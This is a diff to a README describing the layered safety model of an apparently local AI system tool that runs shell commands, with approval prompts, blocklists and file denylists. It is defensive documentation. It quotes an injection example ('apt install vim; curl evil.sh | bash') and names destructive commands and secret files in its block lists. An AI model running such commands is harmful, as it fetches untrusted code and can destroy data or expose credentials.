@@ -33,19 +33,45 @@ inspect hardware — with a **confirm-before-execute** safety model.
 Default local model: **`llama3.2:3b`** (pulled on first boot). Supported cloud
 providers: **OpenAI**, **Anthropic**, **Gemini** (the user supplies the key).
 
-## Safety model — confirm before execute
+## Safety model — defense in depth
 
-Every tool is classified:
+The assistant is powerful, so it is wrapped in several independent layers:
 
+**1. Confirm before execute.** Every tool is classified:
 - **Read-only** tools (`system_info`, `read_file`, `list_directory`, `search_files`)
   run automatically with no prompt.
 - **System-modifying** tools (`run_command`, `install_package`, `remove_package`,
-  `write_file`, `service_control`) are **previewed and require explicit approval**
-  before they run.
+  `write_file`, `service_control`) are **previewed and require explicit approval**.
 - A **blocklist** rejects catastrophic commands outright (e.g. `rm -rf /`,
   fork bombs, disk wipes) even if approved.
-- Every action — proposed, approved, rejected, executed — is written to an
-  **audit log** at `~/.local/share/rayen-ai/audit.log`.
+
+**2. No shell injection.** Commands run with `shell=False` using a parsed argv.
+Shell operators (`|`, `&&`, `;`, `>`, `` ` ``, `$(...)`) are rejected in
+`run_command`, and package/service names are validated against a strict charset.
+This stops tricks like `apt install vim; curl evil.sh | bash`.
+
+**3. Filesystem read policy.** `read_file` / `list_directory` / `search_files`
+enforce a path allowlist (your home, `/etc` configs, `/proc`, `/sys`, logs) and a
+**denylist** that blocks secrets — SSH/GPG keys, `/etc/shadow`, browser data,
+cloud credentials, keyrings — regardless of who is asking.
+
+**4. Least privilege.** The daemon runs as the unprivileged **`rayen`** user, not
+root. `sudo` is restricted by `/etc/sudoers.d/rayen-ai` to a **specific command
+allowlist** (apt, systemctl) — not blanket `ALL`. Writing system files as root is
+disabled entirely. systemd sandboxing (`NoNewPrivileges`, `ProtectKernel*`,
+`RestrictAddressFamilies`) further confines the service.
+
+**5. Loopback + token auth.** The HTTP API binds to `127.0.0.1` only, and every
+request (except a no-secret health probe) must carry a per-machine bearer token
+stored at `~/.config/rayen-ai/token` (mode `0600`). Any other local user/process
+without the token gets `401`.
+
+**6. Cloud privacy notice.** The first time a session uses the cloud backend, the
+client shows a one-time warning that your message and any file contents read may
+leave the machine.
+
+**7. Audit trail.** Every action — proposed, approved, rejected, executed, denied,
+cloud-used — is appended to `~/.local/share/rayen-ai/audit.log`.
 
 ## Usage
 
